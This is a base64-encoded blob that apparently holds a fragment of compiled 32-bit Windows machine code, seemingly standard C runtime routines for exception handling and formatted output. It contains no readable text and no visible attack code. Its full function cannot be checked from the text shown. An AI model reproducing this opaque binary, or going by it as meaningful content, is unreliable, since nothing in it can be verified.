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g+3DjPSiZ3o+///iZ3s+///iZ3E+///iY3k+///ZjvLD4SxCgAAagJbA/ODvej7//8AibXA+///D4yZCgAAjUHgZoP4WHcPD7fBD76AaPcAEIPgD+sCM8APvoTCiPcAEGoHwfgEWomFoPv//zvCD4cgCgAA/ySF/EsAEDPAg430+////4mFmPv//4mFuPv//4mF0Pv//4mF2Pv//4mF+Pv//4mF1Pv//+nnCQAAD7fBg+ggdEqD6AN0NoPoCHQlK8N0FYPoAw+FyAkAAION+Pv//wjpvAkAAION+Pv//wTpsAkAAION+Pv//wHppAkAAIGN+Pv//4AAAADplQkAAAmd+Pv//+mKCQAAZoP5KnUsg8cEib3g+///i3/8ib3Q+///hf8PiWoJAACDjfj7//8E953Q+///6VgJAACLhdD7//9rwAoPt8mNRAjQiYXQ+///6T0JAACDpfT7//8A6TEJAABmg/kqdSaDxwSJveD7//+Lf/yJvfT7//+F/w+JEQkAAION9Pv////pBQkAAIuF9Pv//2vACg+3yY1ECNCJhfT7///p6ggAAA+3wYP4SXRXg/hodEaD+Gx0GIP4dw+FzwgAAIGN+Pv//wAIAADpwAgAAGaDPmx1FwPzgY34+///ABAAAIm1wPv//+mjCAAAg434+///EOmXCAAAg434+///IOmLCAAAD7cGg/g2dR9mg34CNHUYg8YEgY34+///AIAAAIm1wPv//+lkCAAAg/gzdR9mg34CMnUYg8YEgaX4+////3///4m1wPv//+lACAAAg/hkD4Q3CAAAg/hpD4QuCAAAg/hvD4QlCAAAg/h1D4QcCAAAg/h4D4QTCAAAg/hYD4QKCAAAg6Wg+///AIuF3Pv//1GNtej7///HhdT7//8BAAAA6BX8///p4QcAAA+3wYP4ZA+PLwIAAA+EwAIAAIP4Uw+PGwEAAHR+g+hBdBArw3RZK8N0CCvDD4XfBQAAg8Egx4WY+///AQAAAImN5Pv//4ON+Pv//0CDvfT7//8AjZ38+///uAACAACJnfD7//+Jhez7//8PjZICAADHhfT7//8GAAAA6ewCAAD3hfj7//8wCAAAD4XIAAAAg434+///IOm8AAAA94X4+///MAgAAHUHg434+///IIud9Pv//4P7/3UFu////3+DxwT2hfj7//8gib3g+///i3/8ib3w+///D4T3BAAAhf91C6F0ZQEQiYXw+///g6Xs+///AIu18Pv//4XbD44QBQAAigaEwA+EBgUAAI2NqPv//w+2wFFQ6KEzAABZWYXAdAFGRv+F7Pv//zmd7Pv//3zQ6dsEAACD6FgPhPUCAAArww+ElAAAACvCD4T2/v//K8MPhboEAAAPtweDxwQz9kb2hfj7//8gibXU+///ib3g+///iYWk+///dEKIhcj7//+Nhaj7//9Qi4Wo+///xoXJ+///AP+wrAAAAI2FyPv//1CNhfz7//9Q6N4xAACDxBCFwHkPibW4+///6wdmiYX8+///jYX8+///iYXw+///ibXs+///6TYEAACLB4PHBIm94Pv//4XAdDqLSASFyXQz94X4+///AAgAAA+/AImN8Pv//3QSmSvCx4XU+///AQAAAOnxAwAAg6XU+///AOnnAwAAoXRlARCJhfD7//9Q6F0YAABZ6dADAACD+HAPj/gBAAAPhOABAACD+GUPjL4DAACD+GcPjun9//+D+Gl0cYP4bnQog/hvD4WiAwAA9oX4+///gMeF5Pv//wgAAAB0YYGN+Pv//wACAADrVYs3g8cEib3g+///6NgwAACFwA+EYwUAAPaF+Pv//yB0DGaLhej7//9miQbrCIuF6Pv//4kGx4W4+///AQAAAOn0BAAAg434+///QMeF5Pv//woAAACLjfj7///3wQCAAAAPhKcBAACLB4tXBIPHCOnTAQAAdRZmg73k+///Z3Vdx4X0+///AQAAAOtROYX0+///fgaJhfT7//+BvfT7//+jAAAAfjeLtfT7//+Bxl0BAABW6F4KAABZiYXE+///hcB0EImF8Pv//4m17Pv//4vY6wrHhfT7//+jAAAAiweLNSzgABCDxwiJhZD7//+LR/yJhZT7//+Nhaj7//9Q/7WY+///D76F5Pv///+19Pv//4m94Pv//1D/tez7//+NhZD7//9TUP81lGUBEP/W/9CLvfj7//+DxByB54AAAAB0HYO99Pv//wB1FI2FqPv//1BT/zWgZQEQ/9b/0FlZZoO95Pv//2d1GIX/dRSNhaj7//9QU/81nGUBEP/W/9BZWYA7LXURgY34+///AAEAAEOJnfD7//9T6Qb+///HhfT7//8IAAAAiZW8+///6ySD6HMPhGn8//8rww+EjP7//4PoAw+FuwEAAMeFvPv//ycAAAD2hfj7//+Ax4Xk+///EAAAAA+EbP7//2owWGaJhcz7//+Lhbz7//+DwFFmiYXO+///iZ3Y+///6Uf+///3wQAQAAAPhU3+//+DxwT2wSB0GIm94Pv///bBQHQGD79H/OsED7dH/JnrE4tH/PbBQHQDmesCM9KJveD7///2wUB0G4XSfxd8BIXAcxH32IPSAPfagY34+///AAEAAPeF+Pv//wCQAACL+ovYdQIz/4O99Pv//wB9DMeF9Pv//wEAAADrGoOl+Pv///e4AAIAADmF9Pv//34GiYX0+///i8MLx3UGIYXY+///jbX7/f//i4X0+////430+///hcB/BovDC8d0LYuF5Pv//5lSUFdT6J4vAACDwTCJnYz7//+L2Iv6g/k5fgYDjbz7//+IDk7rvY2F+/3//yvGRveF+Pv//wACAACJhez7//+JtfD7//90X4XAdAeLxoA4MHRU/43w+///i4Xw+////4Xs+///xgAw6z2F/3ULoXhlARCJhfD7//+LhfD7///HhdT7//8BAAAA6wpLZoM4AHQHg8AChdt18iuF8Pv//9H4iYXs+///g724+///AA+FqAEAAIuF+Pv//6hAdCupAAEAAHQEai3rDqgBdARqK+sGqAJ0FGogWWaJjcz7///Hhdj7//8BAAAAi73Q+///K73s+///K73Y+///ib3k+///qAx1JOsei4Xc+///aiCNtej7//9P6Iv1//+Dvej7////WXQEhf9/3v+12Pv//4u9nPv//4ud3Pv//42FzPv//1CNhej7///oiPX///aF+Pv//whZWXQv9oX4+///BHUmi73k+///6xpqMI216Pv//4vDT+gt9f//g73o+////1l0BIX/f+KDvdT7//8AdWuLnez7//+F235hi73w+///jYWo+///UIuFqPv///+wrAAAAI2FpPv//1dQS+hhLAAAg8QQiYWM+///hcB+JP+1pPv//4uF3Pv//4216Pv//+jB9P//A72M+///WYXbf7DrLoON6Pv////rJf+17Pv//4u9nPv///+18Pv//4ud3Pv//42F6Pv//+i39P//WVmDvej7//8AfDP2hfj7//8EdCqLveT7///rHouF3Pv//2ogjbXo+///T+hY9P//g73o+////1l0BIX/f96DvcT7//8AdBP/tcT7///oQ93//4OlxPv//wBZi7XA+///D7cGiYXk+///ZoXAdC+LlaD7//+LveD7//+LyOlr9f//6DwCAADHABYAAADo3wEAAIC9tPv//wDpEfX//4C9tPv//wB0CouFsPv//4NgcP2Lhej7//+LTfxfXjPNW+jI0f//ycOQjUMAEHdBABCpQQAQBkIAEFNCABBfQgAQpkIAEK5DABCL/1WL7ItFCKMYbQEQXcOL/1WL7IHsKAMAAKGAWAEQM8WJRfxTi10IV4P7/3QHU+h3JgAAWYOl4Pz//wBqTI2F5Pz//2oAUOj4LAAAjYXg/P//iYXY/P//jYUw/f//g8QMiYXc/P//iYXg/f//iY3c/f//iZXY/f//iZ3U/f//ibXQ/f//ib3M/f//ZoyV+P3//2aMjez9//9mjJ3I/f//ZoyFxP3//2aMpcD9//9mjK28/f//nI+F8P3//4tFBI1NBImN9P3//8eFMP3//wEAAQCJhej9//+LSfyJjeT9//+LTQyJjeD8//+LTRCJjeT8//+Jhez8////FXjgABBqAIv4/xV04AAQjYXY/P//UP8VcOAAEIXAdRCF/3UMg/v/dAdT6IIlAABZi038XzPNW+hv0P//ycOL/1ZqAb4XBADAVmoC6MX+//+DxAxW/xVs4AAQUP8VaOAAEF7Di/9Vi+z/NRhtARD/FSzgABCFwHQDXf/g/3UY/3UU/3UQ/3UM/3UI6K/////MM8BQUFBQUOjH////g8QUw4v/VYvsi0UIM8k7BM0QWwEQdBNBg/ktcvGNSO2D+RF3DmoNWF3DiwTNFFsBEF3DBUT///9qDlk7yBvAI8GDwAhdw+gX6f//hcB1Brh4XAEQw4PACMPoBOn//4XAdQa4fFwBEMODwAzDi/9Vi+xW6OL///+LTQhRiQjogv///1mL8Oi8////iTBeXcPMzMzMzMzMzMzMzMzMzMxosE4AEGT/NQAAAACLRCQQiWwkEI1sJBAr4FNWV6GAWAEQMUX8M8VQiWXo/3X4i0X8x0X8/v///4lF+I1F8GSjAAAAAMOLTfBkiQ0AAAAAWV9fXluL5V1Rw8zMzMzMzMyL/1WL7IPsGFOLXQxWi3MIMzWAWAEQV4sGxkX/AMdF9AEAAACNexCD+P50DYtOBAPPMww46NjO//+LTgyLRggDzzMMOOjIzv//i0UI9kAEZg+FGQEAAItNEI1V6IlT/ItbDIlF6IlN7IP7/nRfjUkAjQRbi0yGFI1EhhCJRfCLAIlF+IXJdBSL1+iUKwAAxkX/AYXAeEB/R4tF+IvYg/j+dc6Aff8AdCSLBoP4/nQNi04EA88zDDjoVc7//4tODItWCAPPMww66EXO//+LRfRfXluL5V3Dx0X0AAAAAOvJi00IgTljc23gdSmDPfjoABAAdCBo+OgAEOgjLAAAg8QEhcB0D4tVCGoBUv8V+OgAEIPECItNDItVCOg0KwAAi0UMOVgMdBJogFgBEFeL04vI6DYrAACLRQyLTfiJSAyLBoP4/nQNi04EA88zDDjov83//4tODItWCAPPMww66K/N//+LRfCLSAiL1+jKKgAAuv7///85UwwPhE////9ogFgBEFeLy+jhKgAA6Rn///9Xi8aD4A+FwA+FwQAAAIvRg+F/weoHdGXrBo2bAAAAAGYPbwZmD29OEGYPb1YgZg9vXjBmD38HZg9/TxBmD39XIGYPf18wZg9vZkBmD29uUGYPb3ZgZg9vfnBmD39nQGYPf29QZg9/d2BmD39/cI22gAAAAI2/gAAAAEp1